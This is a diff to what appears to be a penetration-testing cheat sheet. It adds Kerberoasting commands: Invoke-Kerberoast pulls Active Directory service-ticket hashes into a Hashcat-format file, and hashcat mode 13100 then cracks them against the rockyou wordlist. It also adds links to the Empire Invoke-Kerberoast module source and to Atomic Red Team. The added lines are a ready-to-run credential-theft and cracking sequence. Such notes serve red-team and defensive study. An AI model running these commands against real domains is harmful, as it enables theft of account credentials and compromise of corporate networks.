@@ -82,10 +82,15 @@ Kerberoasting
 ---
 ```
 Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format Hashcat
+Invoke-Kerberoast | fl
+Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
+hashcat -m 13100 --force -a 0 /home/kali/Downloads/hashes.txt /home/kali/Downloads/rockyou.txt
 ```
+- https://atomicredteam.io/credential-access/T1558.003/
 - https://github.com/cyberark/RiskySPN
 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
 - https://www.youtube.com/watch?v=ycNadGeq03E
+- https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1
   
 MEMCM - MDT - PXE
 ---
